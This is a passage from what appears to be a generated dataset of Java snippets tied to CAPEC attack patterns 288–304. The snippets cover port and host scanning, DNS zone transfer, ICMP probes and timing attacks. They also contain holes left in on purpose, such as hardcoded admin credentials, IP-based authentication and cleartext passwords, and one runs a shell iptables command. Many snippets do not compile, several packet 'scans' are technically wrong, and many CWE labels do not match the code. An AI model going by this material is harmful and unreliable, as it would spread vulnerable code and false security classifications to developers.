        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class VulnerablePortScanner {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket();\n            socket.bind(new InetSocketAddress(8080)); // CWE-605: Multiple Binds to the Same Port\n            System.out.println(\"Binding to port 8080...\");\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n            dos.writeUTF(\"username:password\");\n\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            System.out.println(\"Sending sensitive information...\");\n\n            // CWE-1125: Excessive Attack Surface\n            for (int i = 0; i < 1000; i++) {\n                Socket tempSocket = new Socket();\n                tempSocket.bind(new InetSocketAddress(8080));\n                System.out.println(\"Binding to port 8080 again...\");\n            }\n\n            // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n            // Assume this is a debug feature that allows an attacker to alter system behavior\n            System.out.println(\"Activating debug mode...\");\n            socket.setDebug(true);\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable port scanner that embodies the main idea of the CAPEC. It binds to a port, transmits sensitive information in cleartext, exposes sensitive information to unauthorized actors, has an excessive attack surface, and allows activation of test or debug logic at runtime."
    },
    {
        "capec_id": "288",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class AuthenticationBypass {\n    public static void main(String[] args) {\n        try {\n            InetAddress address = InetAddress.getByName(\"example.com\");\n            String hostname = address.getHostName();\n            // Trusting self-reported DNS name\n            if (hostname.equals(\"example.com\")) {\n                // Grant access\n                System.out.println(\"Access granted\");\n            } else {\n                // Deny access\n                System.out.println(\"Access denied\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception\");\n        }\n    }\n}\n\n// Capture-replay attack\npublic class CaptureReplayAttack {\n    public static void main(String[] args) {\n        // Sniff network traffic and capture authentication message\n        String capturedMessage = \"captured authentication message\";\n        // Replay the captured message to the server\n        sendReplayMessage(capturedMessage);\n    }\n    public static void sendReplayMessage(String message) {\n        // Send the replayed message to the server\n        System.out.println(\"Replayed message: \" + message);\n    }\n}\n\n// Call to non-ubiquitous API\npublic class NonUbiquitousAPI {\n    public static void main(String[] args) {\n        // Use an API function that does not exist on all versions of the target platform\n        try {\n            java.awt.Desktop desktop = java.awt.Desktop.getDesktop();\n            desktop.browse(new java.net.URI(\"https://example.com\"));\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern, which includes CWE-294: Authentication Bypass by Capture-replay, CWE-292: Trusting Self-reported DNS Name, and CWE-589: Call to Non-ubiquitous API. The code shows an authentication bypass vulnerability through DNS lookups and capture-replay attacks, as well as the use of a non-ubiquitous API function that may cause portability issues."
    },
    {
        "capec_id": "289",
        "code_snippet": "public class AuthenticationBypass {\n    private static boolean isAdmin = false;\n    private static boolean isAuthorized = false;\n\n    public static void main(String[] args) {\n        // CWE-592: Authentication Bypass Issues\n        if (isAdmin || isAuthorized) {\n            System.out.println(\"Access granted\");\n            // Perform sensitive operations\n        } else {\n            System.out.println(\"Access denied\");\n        }\n\n        // CWE-1303: Non-Transparent Sharing of Microarchitectural Resources\n        // Assuming a multi-threaded environment\n        Thread thread1 = new Thread(new Runnable() {\n            public void run() {\n                // Shared resource access\n                System.out.println(\"Thread 1 accessing shared resource\");\n            }\n        });\n        Thread thread2 = new Thread(new Runnable() {\n            public void run() {\n                // Shared resource access\n                System.out.println(\"Thread 2 accessing shared resource\");\n            }\n        });\n        thread1.start();\n        thread2.start();\n\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        // Assuming a custom address mapping system\n        int protectedRegion = 0x1000;\n        int unprotectedRegion = 0x2000;\n        int overlapRegion = 0x1500;\n        // Overlapping regions can be accessed\n        System.out.println(\"Accessing overlap region: \" + overlapRegion);\n\n        // CWE-216: DEPRECATED: Containment Errors (Container Errors)\n        // Assuming a container class\n        Container container = new Container();\n        container.add(new Object());\n        // Insecure container usage\n        Object obj = container.get(0);\n        System.out.println(\"Accessing object: \" + obj);\n\n        // CWE-1229: Creation of Emergent Resource\n        // Assuming a resource creation system\n        Resource resource = new Resource();\n        // Indirectly creating a new resource\n        resource.createSubResource();\n        System.out.println(\"Sub-resource created\");\n    }\n}\n\n// Custom classes for demonstration purposes\nclass Container {\n    private Object[] objects = new Object[10];\n    private int index = 0;\n\n    public void add(Object obj) {\n        objects[index++] = obj;\n    }\n\n    public Object get(int index) {\n        return objects[index];\n    }\n}\n\nclass Resource {\n    public void createSubResource() {\n        // Create a new resource\n        System.out.println(\"Sub-resource created\");\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC pattern, which includes various CWEs. It showcases authentication bypass issues, non-transparent sharing of microarchitectural resources, fabric-address map overlaps, containment errors, and creation of emergent resources. The code includes insecure practices, such as unprotected access to sensitive operations, shared resource access without synchronization, overlapping address regions, insecure container usage, and indirect resource creation."
    },
    {
        "capec_id": "290",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\n\npublic class MXRecordEnumerator {\n    public static void main(String[] args) {\n        try {\n            DirContext ctx = new InitialDirContext();\n            String dnsRecord = \"dns://\" + args[0];\n            javax.naming.directory.Attributes attrs = ctx.getAttributes(dnsRecord, new String[]{\"MX\"});\n            javax.naming.directory.Attribute attr = attrs.get(\"MX\");\n            String mxRecord = attr.get().toString();\n            InetAddress addr = InetAddress.getByName(mxRecord.split(\" \" )[1]);\n            System.out.println(\"MX Record: \" + mxRecord);\n            System.out.println(\"Mail Server IP: \" + addr.getHostAddress());\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of enumerating MX records for a given domain via a DNS query, which can potentially reveal the IP address of the firewall or other internal systems. The code uses the javax.naming.directory package to perform a DNS query and retrieve the MX record, and then uses InetAddress to resolve the IP address of the mail server. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the IP address of the mail server, which may be located within the DMZ of a network protected by a firewall. Additionally, it relates to CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) as it relies on reverse DNS resolution to obtain the hostname and make a security decision. CWE-224 (Obscured Security-relevant Information by Alternate Name) is also relevant as the code records security-relevant information according to an alternate name of the affected entity (the mail server). CWE-941 (Incorrectly Specified Destination in a Communication Channel) is also applicable as the code creates a communication channel to initiate an outgoing request to the mail server, but does not correctly specify the intended destination. Finally, CWE-223 (Omission of Security-relevant Information) is relevant as the code does not record or display information that would be important for identifying the source or nature of an attack, or determining if an action is safe."
    },
    {
        "capec_id": "291",
        "code_snippet": "import java.util.Hashtable;\nimport javax.naming.directory.Attributes;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\n\npublic class DNSZoneTransfer {\n    public static void main(String[] args) {\n        Hashtable env = new Hashtable();\n        env.put(\"java.naming.factory.initial\", \"com.sun.jndi.dns.DnsContextFactory\");\n        DirContext ctx = new InitialDirContext(env);\n        Attributes attrs = ctx.getAttributes(\"dns://dns.example.com/\", new String[]{\"AXFR\"});\n        Attributes zoneAttrs = (Attributes) attrs.get(\"AXFR\");\n        if (zoneAttrs != null) {\n            System.out.println(\"Zone transfer successful!\");\n            System.out.println(zoneAttrs.get(\"zone\").toString());\n        } else {\n            System.out.println(\"Zone transfer failed.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server to obtain sensitive information about the target organization's internal network. The code uses the JNDI API to perform a zone transfer (AXFR) request to a DNS server, and if successful, it prints out the obtained zone data. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), as it relies on the DNS server to provide sensitive information without proper authorization and verification."
    },
    {
        "capec_id": "292",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class HostDiscovery {\n    public static void main(String[] args) {\n        String ipAddress = \"192.168.1.1\";\n        try {\n            InetAddress address = InetAddress.getByName(ipAddress);\n            if (address.isReachable(5000)) {\n                System.out.println(\"Host is alive: \" + address.getHostName());\n                // CWE-200: Exposing sensitive information\n                System.out.println(\"Host IP Address: \" + address.getHostAddress());\n                // CWE-291: Reliance on IP Address for Authentication\n                authenticateUsingIPAddress(address.getHostAddress());\n                // CWE-319: Cleartext Transmission of Sensitive Information\n                sendSensitiveDataInCleartext(address.getHostAddress());\n            } else {\n                System.out.println(\"Host is not alive\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        }\n    }\n\n    // CWE-509: Replicating Malicious Code\n    public static void replicateMaliciousCode(String ipAddress) {\n        // Malicious code replication logic here\n    }\n\n    // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n    public static void authenticateUsingReverseDNS(String ipAddress) {\n        try {\n            InetAddress address = InetAddress.getByName(ipAddress);\n            String hostname = address.getHostName();\n            // Authenticate using hostname\n            System.out.println(\"Authenticated using hostname: \" + hostname);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        }\n    }\n\n    public static void authenticateUsingIPAddress(String ipAddress) {\n        // Authenticate using IP address\n        System.out.println(\"Authenticated using IP address: \" + ipAddress);\n    }\n\n    public static void sendSensitiveDataInCleartext(String ipAddress) {\n        // Send sensitive data in cleartext\n        System.out.println(\"Sending sensitive data in cleartext to: \" + ipAddress);\n    }\n}",
        "description": "This Java code snippet demonstrates a host discovery attack, where an adversary sends a probe to an IP address to determine if the host is alive. The code uses the InetAddress class to perform a reverse DNS lookup and check if the host is reachable. It also includes examples of CWEs 200, 291, 319, 350, and 509, such as exposing sensitive information, relying on IP address for authentication, transmitting sensitive information in cleartext, relying on reverse DNS resolution for a security-critical action, and replicating malicious code."
    },
    {
        "capec_id": "293",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class Traceroute {\n    public static void main(String[] args) throws IOException {\n        String target = \"example.com\";\n        int port = 80;\n        int ttl = 1;\n        int maxHops = 30;\n\n        while (ttl <= maxHops) {\n            Socket socket = new Socket();\n            socket.setSoTimeout(1000);\n            InetAddress address = InetAddress.getByName(target);\n            socket.connect(new InetSocketAddress(address, port), 1000);\n            socket.setTrafficClass(ttl);\n            OutputStream os = socket.getOutputStream();\n            os.write(\"GET / HTTP/1.1\\r\\nHost: \" + target + \"\\r\\n\\r\\n\".getBytes());\n            os.flush();\n            os.close();\n            socket.close();\n\n            System.out.println(\"Hop \" + ttl + \": \" + socket.getLocalAddress().getHostName());\n            ttl++;\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a traceroute utility. It sends TCP packets to a target destination with incrementing TTL values, similar to the traditional traceroute utility. However, it exposes sensitive information to unauthorized actors by transmitting cleartext data over the network (CWE-319) and does not properly prevent sensitive system-level information from being accessed (CWE-497). Additionally, it does not correctly specify the intended destination for the outgoing request (CWE-941) and exposes sensitive information to unauthorized actors (CWE-200). The code also does not properly manage sensitive trace data (CWE-1323) as it stores the trace data in unprotected locations."
    },
    {
        "capec_id": "294",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPAddressMaskRequest {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress targetAddress = InetAddress.getByName(\"target_ip_address\");\n        byte[] buffer = new byte[1024];\n        buffer[0] = (byte) 0x11; // ICMP type 17 - Address Mask Request\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 0);\n        socket.send(packet);\n        DatagramPacket receivePacket = new DatagramPacket(new byte[1024], 1024);\n        socket.receive(receivePacket);\n        byte[] receiveData = receivePacket.getData();\n        // Process the received ICMP type 18 Address Mask Reply datagram\n        // and extract the subnet information, default gateway, and broadcast address\n        // without proper authentication or authorization checks\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of an ICMP Address Mask Request, which can be used to gather sensitive information about a target's networking configuration. The code sends an ICMP type 17 message to the target and receives an ICMP type 18 response, which contains the subnet information, default gateway, and broadcast address. The code does not perform proper authentication or authorization checks, making it vulnerable to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor. Additionally, the code relies on the IP address for authentication (CWE-291) and does not restrict the communication channel to the intended endpoint (CWE-923)."
    },
    {
        "capec_id": "295",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.Date;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TimingAttackServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n        PrintWriter out = resp.getWriter();\n        long startTime = new Date().getTime();\n        if (authenticate(username, password)) {\n            long endTime = new Date().getTime();\n            long timeTaken = endTime - startTime;\n            out.println(\"Authenticated in \" + timeTaken + \" milliseconds\");\n        } else {\n            out.println(\"Authentication failed\");\n        }\n    }\n\n    private boolean authenticate(String username, String password) {\n        // Simulating authentication delay based on username\n        try {\n            if (username.equals(\"admin\")) {\n                Thread.sleep(2000);\n            } else {\n                Thread.sleep(1000);\n            }\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n        // Authentication logic goes here\n        return username.equals(\"admin\") && password.equals(\"password\");\n    }\n}",
        "description": "This Java code snippet demonstrates a timing attack vulnerability. The servlet takes a username and password as GET request parameters and measures the time taken to authenticate the user. The authentication delay is intentionally introduced based on the username, making it possible for an attacker to infer the existence of a user by observing the response time. This code embodies CWE-200 (Exposure of Sensitive Information), CWE-208 (Observable Timing Discrepancy), CWE-385 (Covert Timing Channel), CWE-294 (Authentication Bypass by Capture-replay), and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "296",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPInformationRequest {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        InetAddress address = packet.getAddress();\n        int port = packet.getPort();\n        String info = \"ICMP Information Request received from \" + address + \":\" + port;\n        System.out.println(info);\n        // Send sensitive system information in cleartext\n        String sensitiveInfo = \"System Configuration: \" + System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n        DatagramPacket response = new DatagramPacket(sensitiveInfo.getBytes(), sensitiveInfo.getBytes().length, address, port);\n        socket.send(response);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation that responds to ICMP Information Requests by sending sensitive system information in cleartext. The code receives an ICMP packet, extracts the sender's address and port, and then sends a response packet containing system configuration details. This code embodies the CAPEC and CWEs by exposing sensitive information to an unauthorized actor, using a deprecated mechanism, and transmitting sensitive data in cleartext."
    },
    {
        "capec_id": "297",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPACKPing {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket();\n        socket.bind(new InetSocketAddress(\"0.0.0.0\", 8080)); // CWE-605: Multiple Binds to the Same Port\n        socket.connect(new InetSocketAddress(\"target_host\", 80));\n\n        // CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            public void run() {\n                try {\n                    socket.close();\n                } catch (IOException e) {}\n            }\n        });\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(\"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\");\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        byte[] ackPacket = new byte[] {(byte) 0x06, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x50, (byte) 0x02, (byte) 0x02, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x10, (byte) 0x11, (byte) 0x12, (byte) 0x13, (byte) 0x14, (byte) 0x15, (byte) 0x16, (byte) 0x17, (byte) 0x18, (byte) 0x19, (byte) 0x1a, (byte) 0x1b, (byte) 0x1c, (byte) 0x1d, (byte) 0x1e, (byte) 0x1f};\n        DatagramSocket datagramSocket = new DatagramSocket();\n        datagramSocket.send(new DatagramPacket(ackPacket, ackPacket.length, InetAddress.getByName(\"target_host\"), 80));\n\n        // CWE-1276: Hardware Child Block Incorrectly Connected to Parent System\n        Runtime.getRuntime().exec(\"iptables -A INPUT -p tcp --dport 80 -j ACCEPT\");\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP ACK ping attack, which sends an ACK packet to a target host to determine if it is alive. The code includes vulnerabilities related to CWE-605 (Multiple Binds to the Same Port), CWE-828 (Signal Handler with Functionality that is not Asynchronous-Safe), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), and CWE-1276 (Hardware Child Block Incorrectly Connected to Parent System)."
    },
    {
        "capec_id": "298",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class UDPping {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(1000);\n            InetAddress address = InetAddress.getByName(\"target_host\");\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            packet.setSocketAddress(new InetSocketAddress(address, 65000));\n            socket.send(packet);\n            socket.receive(packet);\n            System.out.println(\"Host is alive\");\n        } catch (SocketTimeoutException e) {\n            System.out.println(\"Host is not alive\");\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP ping attack, which sends a UDP datagram to a random high port on the target host to solicit an 'ICMP port unreachable' message, indicating that the host is alive. The code uses a DatagramSocket to send and receive UDP packets, and sets a timeout to handle cases where the host does not respond. The code also prints sensitive information (host status) to the console, which is a CWE-200. Additionally, the code binds to a random port without proper authorization, which is a CWE-605. The code also transmits sensitive information (UDP packets) in cleartext, which is a CWE-319. Furthermore, the code does not properly handle outbound error messages, which is a CWE-1320. Finally, the code does not correctly specify the intended destination for the UDP packet, which is a CWE-941."
    },
    {
        "capec_id": "299",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPHostDiscovery {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket();\n        socket.bind(new InetSocketAddress(8080)); // CWE-605: Multiple Binds to the Same Port\n\n        String host = \"target_host\";\n        int port = 80;\n        Socket targetSocket = new Socket(host, port);\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        OutputStream outputStream = targetSocket.getOutputStream();\n        outputStream.write(\"GET / HTTP/1.1\\r\\nHost: \" + host + \"\\r\\n\\r\\n\".getBytes());\n\n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        InputStream inputStream = targetSocket.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead = inputStream.read(buffer);\n        String response = new String(buffer, 0, bytesRead);\n\n        if (response.contains(\"HTTP/1.1 200\")) {\n            System.out.println(\"Host is alive\");\n        } else {\n            System.out.println(\"Host is not alive\");\n        }\n\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No message integrity check is performed on the received response\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // The response is printed to the console, potentially exposing sensitive information\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of using TCP SYN packets for host discovery, with additional CWEs for context. It creates a socket and binds it to a port, then sends a GET request to a target host and port. The response is read and printed to the console, without checking for message integrity or handling sensitive information securely."
    },
    {
        "capec_id": "300",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class PortScanner {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"example.com\", 80);\n            System.out.println(\"Port 80 is open\");\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        } catch (IOException e) {\n            System.out.println(\"Port 80 is closed\");\n        }\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Server response: \" + getServerResponse(\"example.com\", 80));\n\n        // CWE-605: Multiple Binds to the Same Port\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n        Socket clientSocket = serverSocket.accept();\n        System.out.println(\"Client connected\");\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        sendSensitiveDataInCleartext(\"example.com\", 8080, \"username\", \"password\");\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        // Assume a hardware device with a debug port\n        HardwareDevice device = new HardwareDevice(\"/dev/debug_port\");\n        device.activateDebugMode();\n        System.out.println(\"Debug mode activated\");\n\n        // CWE-918: Server-Side Request Forgery (SSRF)\n        String url = \"http://example.com/malicious_url\";\n        String response = sendHttpRequest(url);\n        System.out.println(\"Response from \" + url + \": \" + response);\n    }\n\n    private static String getServerResponse(String host, int port) {\n        Socket socket = new Socket(host, port);\n        InputStream inputStream = socket.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead = inputStream.read(buffer);\n        return new String(buffer, 0, bytesRead);\n    }\n\n    private static void sendSensitiveDataInCleartext(String host, int port, String username, String password) {\n        Socket socket = new Socket(host, port);\n        OutputStream outputStream = socket.getOutputStream();\n        String data = \"username=\" + username + \"&password=\" + password;\n        outputStream.write(data.getBytes());\n    }\n\n    private static String sendHttpRequest(String url) {\n        URL obj = new URL(url);\n        HttpURLConnection con = (HttpURLConnection) obj.openConnection();\n        int responseCode = con.getResponseCode();\n        if (responseCode == 200) {\n            return \"OK\";\n        } else {\n            return \"Failed\";\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of port scanning and incorporates related CWEs. It includes a port scanner that checks if a port is open, exposes sensitive information, allows multiple binds to the same port, transmits sensitive information in cleartext, activates debug logic at runtime, and performs server-side request forgery."
    },
    {
        "capec_id": "301",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\n\npublic class TCPConnectScanner {\n    public static void main(String[] args) {\n        String host = \"target-system\";\n        int port = 80;\n        try {\n            Socket socket = new Socket();\n            socket.bind(new InetSocketAddress(\"0.0.0.0\", 0)); // CWE-605: Multiple Binds to the Same Port\n            socket.connect(new InetSocketAddress(host, port));\n            System.out.println(\"Port \" + port + \" is open on \" + host);\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            System.out.println(\"Connected from IP address: \" + socket.getInetAddress());\n            // CWE-291: Reliance on IP Address for Authentication\n            if (socket.getInetAddress().getHostAddress().equals(\"authorized-ip\")) {\n                System.out.println(\"Authorized access granted\");\n            }\n            // CWE-617: Reachable Assertion\n            assert socket.isConnected();\n            // CWE-353: Missing Support for Integrity Check\n            byte[] data = new byte[1024];\n            socket.getInputStream().read(data);\n            System.out.println(\"Received data: \" + new String(data));\n        } catch (Exception e) {\n            System.out.println(\"Port \" + port + \" is closed on \" + host);\n        }\n    }\n}",
        "description": "Java code snippet that demonstrates a TCP connect scanner, which establishes a full TCP connection to determine if a port is open on a target system. The code includes vulnerabilities related to exposure of sensitive information, multiple binds to the same port, reliance on IP address for authentication, reachable assertion, and missing support for integrity check."
    },
    {
        "capec_id": "302",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPFINScan {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket();\n        socket.bind(new InetSocketAddress(\"localhost\", 8080));\n        socket.setReuseAddress(true);\n        \n        // CWE-605: Multiple Binds to the Same Port\n        Socket socket2 = new Socket();\n        socket2.bind(new InetSocketAddress(\"localhost\", 8080));\n        \n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        Socket socket3 = new Socket(\"localhost\", 8080);\n        \n        // CWE-319: Cleartext Transmission of Sensitive Information\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(\"Sensitive Information\".getBytes());\n        \n        // CWE-353: Missing Support for Integrity Check\n        outputStream.write(new byte[1024]);\n        \n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Received data: \" + new String(outputStream.toString().getBytes()));\n        \n        // CAPEC: TCP FIN Scan\n        SocketAddress sockaddr = new InetSocketAddress(\"localhost\", 8081);\n        socket.connect(sockaddr);\n        socket.shutdownOutput();\n        \n        // Send a FIN packet\n        TCPFINScan.sendFINPacket(socket);\n        \n        // Receive a RST packet\n        byte[] buffer = new byte[1024];\n        InputStream inputStream = socket.getInputStream();\n        int bytesRead = inputStream.read(buffer);\n        if (bytesRead == -1) {\n            System.out.println(\"Port is closed\");\n        } else {\n            System.out.println(\"Port is open\");\n        }\n    }\n    \n    public static void sendFINPacket(Socket socket) throws Exception {\n        // Create a raw socket\n        DatagramSocket datagramSocket = new DatagramSocket();\n        \n        // Create a TCP packet with the FIN flag set\n        byte[] packet = new byte[1024];\n        packet[13] = (byte) 0x01; // FIN flag\n        \n        // Send the packet\n        datagramSocket.send(new DatagramPacket(packet, packet.length, new InetSocketAddress(\"localhost\", 8081)));\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP FIN scan attack, which can be used to identify closed ports on a target machine. The code also incorporates several CWEs, including CWE-605 (Multiple Binds to the Same Port), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-353 (Missing Support for Integrity Check), and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)."
    },
    {
        "capec_id": "303",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\n\npublic class TCPXMASScan {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket();\n        InetSocketAddress address = new InetSocketAddress(\"target_machine\", 80);\n        socket.connect(address);\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // CWE-353: Missing Support for Integrity Check\n        byte[] packet = new byte[] {(byte) 0x01, (byte) 0x02, (byte) 0x04, (byte) 0x08, (byte) 0x10, (byte) 0x20, (byte) 0x40, (byte) 0x80};\n        socket.getOutputStream().write(packet);\n        byte[] response = new byte[1024];\n        int bytesRead = socket.getInputStream().read(response);\n        if (bytesRead != -1) {\n            // Check if the response is a RST packet\n            if (response[0] == (byte) 0x04 && response[1] == (byte) 0x04) {\n                System.out.println(\"Port is closed\");\n            } else {\n                System.out.println(\"Port is open\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP XMAS scan attack, which sends a TCP segment with all possible flags set in the packet header to determine if a port is closed on the target machine. The code establishes a socket connection to the target machine, sends an illegal packet with all flags set, and checks the response for a RST packet, indicating a closed port. The code embodies CWE-200, CWE-319, CWE-923, CWE-924, and CWE-353 by transmitting sensitive information in cleartext, lacking integrity checks, and improperly restricting the communication channel."
    },
    {
        "capec_id": "304",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\n\npublic class TCPNULLScan {\n    public static void main(String[] args) {\n        String host = \"target_machine\";\n        int port = 8080;\n        Socket socket = new Socket();\n        try {\n            socket.connect(new InetSocketAddress(host, port));\n            // CWE-200: Exposure of Sensitive Information\n            System.out.println(\"Connected to \" + host + \":\" + port);\n            // CWE-353: Missing Support for Integrity Check\n            // No integrity check is performed on the data transmission\n            socket.getOutputStream().write(\"NULL packet\".getBytes());\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            // Sensitive information is transmitted in cleartext\n            socket.getOutputStream().write(\"Sensitive data\".getBytes());\n            // CWE-690: Unchecked Return Value to NULL Pointer Dereference\n            // No error checking is performed on the socket connection\n            socket.getInputStream().read();\n            // CWE-476: NULL Pointer Dereference\n            // Dereferencing a null pointer\n            String response = ((Socket) null).getInputStream().read();\n            System.out.println(\"Response: \" + response);\n        } catch (IOException e) {\n            // CWE-200: Exposure of Sensitive Information\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP NULL scan attack, which sends TCP segments with no flags in the packet header to determine if ports are closed on the target machine. The code also incorporates CWEs 200, 353, 319, 690, and 476, which include exposure of sensitive information, missing support for integrity checks, cleartext transmission of sensitive information, unchecked return values to null pointer dereferences, and null pointer dereferences."
    },
    {
        "capec_id": "305",
